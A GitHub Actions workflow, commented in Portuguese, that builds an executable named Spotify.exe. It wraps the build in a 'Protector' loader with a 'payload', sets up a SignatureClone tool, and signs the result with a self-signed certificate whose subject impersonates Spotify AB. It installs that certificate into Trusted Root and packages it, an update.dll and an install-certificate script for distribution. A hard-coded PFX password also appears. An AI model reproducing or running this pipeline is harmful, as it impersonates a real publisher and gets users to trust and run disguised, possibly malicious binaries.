name: Build Spotify - Costura + Protector
on:
  push:
    branches: [ main, master, develop ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: üßæ Checkout c√≥digo
        uses: actions/checkout@v4

      - name: ‚öôÔ∏è Configurar .NET
        uses: actions/setup-dotnet@v3
        with:
          dotnet-version: '6.0.x'

      - name: ‚öôÔ∏è Configurar Visual Studio
        uses: microsoft/setup-msbuild@v1.3

      - name: üì¶ Instalar NuGet CLI
        run: choco install nuget.commandline -y

      - name: üîß Configurar FodyWeavers.xml
        shell: pwsh
        run: |
          Write-Host "üîß Criando FodyWeavers.xml..."
        
          $xml = '<?xml version="1.0" encoding="utf-8"?>'
          $xml += '<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">'
          $xml += '  <Costura />'
          $xml += '</Weavers>'
        
          $xml | Out-File -FilePath "FodyWeavers.xml" -Encoding UTF8 -Force
          Write-Host "‚úÖ FodyWeavers.xml configurado!"

      - name: üóëÔ∏è Limpar bin/obj
        shell: pwsh
        run: |
          @("bin", "obj") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Recurse -Force $_ -ErrorAction SilentlyContinue }
          }

      - name: üîÑ Restaurar depend√™ncias solu√ß√£o
        shell: pwsh
        run: |
          nuget restore Spotify.sln -Verbosity detailed
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üî® Compilar Release com Costura
        shell: pwsh
        run: |
          msbuild Spotify.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /verbosity:minimal /p:UseSharedCompilation=false
          if ($LASTEXITCODE -ne 0) { exit 1 }
          if (!(Test-Path "bin\Release\Spotify.exe")) { Write-Host "‚ùå Execut√°vel n√£o gerado"; exit 1 }

      - name: üîß Compilar Update DLL (update.dll)
        shell: pwsh
        run: |
          if (!(Test-Path "Update\Update.csproj")) { Write-Host "‚ùå Update.csproj n√£o encontrado"; exit 1 }
          msbuild Update\Update.csproj /p:Configuration=Release /m
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $dll = (Get-ChildItem "Update\bin\Release" -Recurse -Filter update.dll | Select-Object -First 1).FullName
          if (!$dll) { Write-Host "‚ùå update.dll n√£o encontrado ap√≥s build"; exit 1 }
          if (!(Test-Path "bin\Release")) { New-Item -ItemType Directory -Path "bin\Release" | Out-Null }
          Copy-Item $dll "bin\Release\update.dll" -Force

      - name: üõ°Ô∏è Compilar Protector (Mono.Cecil)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector\Protector.csproj")) { Write-Host "‚ùå Projeto Protector n√£o encontrado"; exit 1 }
          dotnet restore Protector\Protector.csproj
          dotnet build Protector\Protector.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üõ°Ô∏è Compilar Loader (Protector.Loader)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector.Loader\Protector.Loader.csproj")) { Write-Host "‚ùå Projeto Loader n√£o encontrado"; exit 1 }
          dotnet restore Protector.Loader\Protector.Loader.csproj
          dotnet build Protector.Loader\Protector.Loader.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $global:loaderPath = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$global:loaderPath) { Write-Host "‚ùå Loader compilado n√£o encontrado"; exit 1 }

      - name: üõ°Ô∏è Aplicar Protector (empacotar Loader + payload)
        shell: pwsh
        run: |
          $protExe = (Get-ChildItem "Protector\bin\Release" -Recurse -Filter Protector.exe | Select-Object -First 1).FullName
          if (!$protExe) { Write-Host "‚ùå Protector.exe n√£o encontrado"; exit 1 }
          $input = "bin\Release\Spotify.exe"
          $outDir = "bin\Protected"
          if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
          $output = "$outDir\Spotify.exe"
          $loader = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$loader) { Write-Host "‚ùå Loader n√£o encontrado"; exit 1 }
          & $protExe $input $output $loader
          if ($LASTEXITCODE -ne 0) { Write-Host "‚ùå Falha ao proteger"; exit 1 }

      - name: üîç Verificar resultado protegido
        shell: pwsh
        run: |
          $protected = "bin\Protected\Spotify.exe"
          if (!(Test-Path $protected)) { Write-Host "‚ùå Arquivo protegido n√£o gerado"; exit 1 }
          $orig = (Get-Item "bin\Release\Spotify.exe").Length
          $prot = (Get-Item $protected).Length
          Write-Host "üìä Original: $([math]::Round($orig/1MB,2)) MB"
          Write-Host "üõ°Ô∏è Protegido: $([math]::Round($prot/1MB,2)) MB"

      - name: üêç Configurar Python e SignatureClone
        shell: pwsh
        run: |
          Write-Host "üêç Configurando Python e SignatureClone..."
          
          # Instalar Python se necess√°rio
          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
            choco install python -y
            $env:Path += ";C:\Python*\Scripts;C:\Python*"
          }
          
          # Instalar depend√™ncias do SignatureClone
          pip install pefile cryptography
          
          # Verificar se SignatureClone est√° dispon√≠vel
          if (!(Test-Path "SignatureClone-main\SignatureClone.py")) {
            Write-Host "‚ùå SignatureClone n√£o encontrado"
            exit 1
          }
          
          Write-Host "‚úÖ Python e depend√™ncias configuradas"

      - name: üîê Criar certificado autoassinado
        shell: pwsh
        run: |
          Write-Host "üîê Criando certificado autoassinado para assinatura v√°lida..."
          
          # Criar certificado autoassinado
          $certParams = @{
            Subject = "CN=Spotify AB, O=Spotify AB, L=Stockholm, C=SE"
            Type = "CodeSigningCert"
            CertStoreLocation = "Cert:\CurrentUser\My"
            KeyExportPolicy = "Exportable"
            KeySpec = "Signature"
            KeyLength = 2048
            KeyAlgorithm = "RSA"
            HashAlgorithm = "SHA256"
            NotAfter = (Get-Date).AddYears(10)
          }
          
          $cert = New-SelfSignedCertificate @certParams
          Write-Host "‚úÖ Certificado criado: $($cert.Thumbprint)"
          
          # Exportar certificado para arquivo PFX (com senha)
          $pwd = ConvertTo-SecureString -String "SpotifySignature2024" -Force -AsPlainText
          $pfxPath = "SpotifyCodeSign.pfx"
          Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd
          Write-Host "‚úÖ Certificado exportado: $pfxPath"
          
          # Exportar certificado p√∫blico para instala√ß√£o
          $cerPath = "SpotifyCodeSign.cer"
          Export-Certificate -Cert $cert -FilePath $cerPath
          Write-Host "‚úÖ Certificado p√∫blico exportado: $cerPath"
          
          # Instalar certificado na Trusted Root (para assinatura v√°lida localmente)
          try {
            $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root","LocalMachine")
            $store.Open("ReadWrite")
            
            # Verificar se j√° existe
            $existingCert = $store.Certificates | Where-Object { $_.Thumbprint -eq $cert.Thumbprint }
            if ($existingCert) {
              Write-Host "üìå Certificado j√° est√° em Trusted Root"
            } else {
              $store.Add($cert)
              Write-Host "‚úÖ Certificado instalado em Trusted Root"
            }
            
            $store.Close()
          } catch {
            Write-Host "‚ö†Ô∏è Aviso ao instalar em Root: $($_.Exception.Message)"
            Write-Host "üí° Continuando sem instala√ß√£o em Root..."
          }

      - name: üîè Assinar execut√°vel com signtool.exe
        shell: pwsh
        run: |
          Write-Host "üîè Assinando execut√°vel com signtool.exe..."
          
          # Localizar signtool.exe no Windows SDK
          $signtoolPaths = @(
            "${env:ProgramFiles(x86)}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles(x86)}\Windows Kits\10\App Certification Kit\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\App Certification Kit\signtool.exe"
          )
          
          $signtool = $null
          foreach ($path in $signtoolPaths) {
            $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) {
              $signtool = $found.FullName
              break
            }
          }
          
          if (!$signtool) {
            Write-Host "‚ö†Ô∏è signtool.exe n√£o encontrado, instalando Windows SDK..."
            choco install windows-sdk-10.1 -y
            
            # Tentar localizar novamente
            foreach ($path in $signtoolPaths) {
              $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
              if ($found) {
                $signtool = $found.FullName
                break
              }
            }
            
            if (!$signtool) {
              Write-Host "‚ùå signtool.exe ainda n√£o encontrado ap√≥s instala√ß√£o"
              exit 1
            }
          }
          
          Write-Host "‚úÖ signtool.exe encontrado: $signtool"
          
          # Verificar e preparar arquivos para assinatura
          $targetFile = "bin\Protected\Spotify.exe"
          $pfxFile = "SpotifyCodeSign.pfx"
          $pwd = "SpotifySignature2024"
          
          if (!(Test-Path $targetFile)) {
            Write-Host "‚ùå Arquivo alvo n√£o encontrado: $targetFile"
            exit 1
          }
          
          if (!(Test-Path $pfxFile)) {
            Write-Host "‚ùå Arquivo PFX n√£o encontrado: $pfxFile"
            exit 1
          }
          
          # Obter caminhos absolutos
          $targetFileAbs = (Get-Item $targetFile).FullName
          $pfxFileAbs = (Get-Item $pfxFile).FullName
          
          Write-Host "üìã Arquivo para assinar: $targetFileAbs"
          Write-Host "üìã Certificado PFX: $pfxFileAbs"
          Write-Host "üìã Tamanho do PFX: $((Get-Item $pfxFileAbs).Length) bytes"
          
          # Verificar permiss√µes do PFX
          try {
            $acl = Get-Acl $pfxFileAbs
            Write-Host "‚úÖ Permiss√µes do PFX OK"
          } catch {
            Write-Host "‚ö†Ô∏è Aviso ao verificar permiss√µes: $($_.Exception.Message)"
          }
          
          # Comando de assinatura
          Write-Host "üìù Executando assinatura..."
          
          # Tentar assinatura com timestamp
          try {
            Write-Host "üåê Tentando assinatura com timestamp..."
            & $signtool sign /f $pfxFileAbs /p $pwd /t http://timestamp.digicert.com /fd SHA256 /v $targetFileAbs
            
            if ($LASTEXITCODE -ne 0) {
              throw "Falha com timestamp"
            }
            
            Write-Host "‚úÖ Assinado com timestamp do DigiCert"
          } catch {
            Write-Host "‚ö†Ô∏è Timestamp falhou, tentando sem timestamp..." -ForegroundColor Yellow
            
            # Tentar sem timestamp
            & $signtool sign /f $pfxFileAbs /p $pwd /fd SHA256 /v $targetFileAbs
            
            if ($LASTEXITCODE -ne 0) {
              Write-Host "‚ùå Falha ao assinar execut√°vel" -ForegroundColor Red
              Write-Host "√öltima sa√≠da: $output"
              exit 1
            }
            
            Write-Host "‚úÖ Assinado sem timestamp (validade limitada)"
          }
          
          Write-Host "‚úÖ Execut√°vel assinado com sucesso!"
          
          # Verificar assinatura
          $cert = Get-AuthenticodeSignature $targetFileAbs
          Write-Host "üîç Status da assinatura: $($cert.Status)"
          Write-Host "üîç Certificado: $($cert.SignerCertificate.Subject)"
          
          if ($cert.TimeStamperCertificate) {
            Write-Host "üîç Timestamp: $($cert.TimeStamperCertificate.Subject)"
          } else {
            Write-Host "‚ö†Ô∏è Sem timestamp - assinatura expira com certificado"
          }
          
          # Renomear para Spotify_Signed.exe
          $signedFile = "bin\Protected\Spotify_Signed.exe"
          Copy-Item $targetFileAbs $signedFile -Force
          Write-Host "‚úÖ Arquivo assinado copiado para: $signedFile"
          
          $finalSize = (Get-Item $signedFile).Length
          Write-Host "üìä Tamanho final: $([math]::Round($finalSize/1MB,2)) MB"

      - name: üîê Verificar instala√ß√£o do certificado
        shell: pwsh
        run: |
          Write-Host "üîê Verificando instala√ß√£o do certificado no Trusted Root..."
          
          # Verificar se certificado est√° instalado
          $certSubject = "CN=Spotify AB, O=Spotify AB, L=Stockholm, C=SE"
          $installedCerts = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Subject -eq $certSubject }
          
          if ($installedCerts) {
            Write-Host "‚úÖ Certificado encontrado em Trusted Root!" -ForegroundColor Green
            Write-Host "üìã Thumbprint: $($installedCerts[0].Thumbprint)" -ForegroundColor White
            Write-Host "üìã V√°lido at√©: $($installedCerts[0].NotAfter.ToString('dd/MM/yyyy'))" -ForegroundColor White
            
            # Verificar status da assinatura do execut√°vel
            $signedFile = "bin\Protected\Spotify_Signed.exe"
            if (Test-Path $signedFile) {
              $sig = Get-AuthenticodeSignature $signedFile
              Write-Host ""
              Write-Host "üîç Status da assinatura do execut√°vel:" -ForegroundColor Cyan
              Write-Host "üìä Status: $($sig.Status)" -ForegroundColor $(if ($sig.Status -eq "Valid") { "Green" } else { "Yellow" })
              Write-Host "üìä Certificado: $($sig.SignerCertificate.Subject)" -ForegroundColor White
              
              if ($sig.TimeStamperCertificate) {
                Write-Host "üìä Timestamp: $($sig.TimeStamperCertificate.Subject)" -ForegroundColor Green
              }
              
              if ($sig.Status -eq "Valid") {
                Write-Host ""
                Write-Host "üéâ ASSINATURA TOTALMENTE V√ÅLIDA E CONFI√ÅVEL!" -ForegroundColor Green
              } elseif ($sig.Status -eq "UnknownError") {
                Write-Host ""
                Write-Host "‚ö†Ô∏è Assinatura presente mas pode ter problemas de confian√ßa" -ForegroundColor Yellow
                Write-Host "üí° Usu√°rios devem instalar SpotifyCodeSign.cer" -ForegroundColor Cyan
              }
            }
          } else {
            Write-Host "‚ö†Ô∏è Certificado n√£o encontrado em Trusted Root" -ForegroundColor Yellow
            Write-Host "üí° Usu√°rios devem instalar SpotifyCodeSign.cer manualmente" -ForegroundColor Cyan
          }
          
          Write-Host ""
          Write-Host "üì¶ Arquivos para distribui√ß√£o:" -ForegroundColor Cyan
          Write-Host "   ‚úÖ Spotify_Signed.exe (execut√°vel assinado)" -ForegroundColor White
          Write-Host "   ‚úÖ SpotifyCodeSign.cer (certificado p√∫blico)" -ForegroundColor White
          Write-Host "   ‚úÖ update.dll (DLL com m√©todos Tavinho)" -ForegroundColor White
          Write-Host "   ‚ö†Ô∏è SpotifyCodeSign.pfx (N√ÉO distribuir - chave privada!)" -ForegroundColor Red

      - name: üß™ Teste de execu√ß√£o
        shell: pwsh
        run: |
          function Test-Exe { param([string]$Path,[string]$Label)
            Write-Host "üìã $Label"
            $testDir = "test_$([guid]::NewGuid().ToString('N').Substring(0,8))"
            try {
              New-Item -ItemType Directory -Path $testDir | Out-Null
              Copy-Item $Path "$testDir\Spotify.exe"
              $p = Start-Process -FilePath "$testDir\Spotify.exe" -PassThru -WindowStyle Hidden -ErrorAction Stop
              Start-Sleep -Seconds 2
              if ($p -and !$p.HasExited) { Write-Host "‚úÖ OK (PID $($p.Id))"; $p.Kill(); return $true } else { return $false }
            } catch { Write-Host "‚ùå Erro: $($_.Exception.Message)"; return $false } finally { if (Test-Path $testDir) { Remove-Item -Recurse -Force $testDir -ErrorAction SilentlyContinue } }
          }
          
          function Test-Certificate { param([string]$Path)
            try {
              $cert = Get-AuthenticodeSignature $Path
              if ($cert.Status -eq "Valid") {
                Write-Host "‚úÖ Certificado v√°lido: $($cert.SignerCertificate.Subject)"
                return $true
              } elseif ($cert.Status -eq "NotSigned") {
                Write-Host "‚ö†Ô∏è Arquivo n√£o assinado"
                return $false
              } else {
                Write-Host "‚ö†Ô∏è Certificado presente mas inv√°lido: $($cert.Status)"
                return $true  # Certificado presente mas inv√°lido (esperado com clone)
              }
            } catch {
              Write-Host "‚ùå Erro ao verificar certificado: $($_.Exception.Message)"
              return $false
            }
          }
          
          $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
          $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
          
          # Verificar certificado no arquivo final
          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
            Test-Certificate "bin\Protected\Spotify_Signed.exe"
          }
          
          if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }

      - name: üì¶ Preparar arquivos para distribui√ß√£o
        shell: pwsh
        run: |
          Write-Host "üì¶ Preparando pacote de distribui√ß√£o..." -ForegroundColor Cyan
          
          # Criar diret√≥rio de distribui√ß√£o
          $distDir = "Distribuicao"
          if (!(Test-Path $distDir)) {
            New-Item -ItemType Directory -Path $distDir | Out-Null
          }
          
          # Copiar arquivos principais
          Copy-Item "bin\Protected\Spotify_Signed.exe" "$distDir\Spotify_Signed.exe" -Force
          Copy-Item "bin\Release\update.dll" "$distDir\update.dll" -Force
          Copy-Item "SpotifyCodeSign.cer" "$distDir\SpotifyCodeSign.cer" -Force
          
          # Copiar scripts de instala√ß√£o
          if (Test-Path "install-certificate.ps1") {
            Copy-Item "install-certificate.ps1" "$distDir\install-certificate.ps1" -Force
          }
          
          if (Test-Path "DISTRIBUICAO_README.md") {
            Copy-Item "DISTRIBUICAO_README.md" "$distDir\README.md" -Force
          }
          
          Write-Host "‚úÖ Arquivos copiados para $distDir" -ForegroundColor Green
          Write-Host ""
          Write-Host "üìã Conte√∫do do pacote:" -ForegroundColor Cyan
          Get-ChildItem $distDir | ForEach-Object {
            $size = if ($_.Length -gt 1MB) { "$([math]::Round($_.Length/1MB,2)) MB" } else { "$([math]::Round($_.Length/1KB,2)) KB" }
            Write-Host "   ‚úÖ $($_.Name) ($size)" -ForegroundColor White
          }

      - name: üìÅ Upload Arquivos de Distribui√ß√£o
        uses: actions/upload-artifact@v4
        with:
          name: spotify-signed-package
          path: |
            Distribuicao/Spotify_Signed.exe
            Distribuicao/update.dll
            Distribuicao/SpotifyCodeSign.cer
            Distribuicao/install-certificate.ps1
            Distribuicao/README.md
          retention-days: 90
        if: always()

      - name: üìÅ Upload Certificado Privado (Backup)
        uses: actions/upload-artifact@v4
        with:
          name: certificate-private-backup
          path: |
            SpotifyCodeSign.pfx
            SpotifyCodeSign.cer
          retention-days: 90
        if: always()
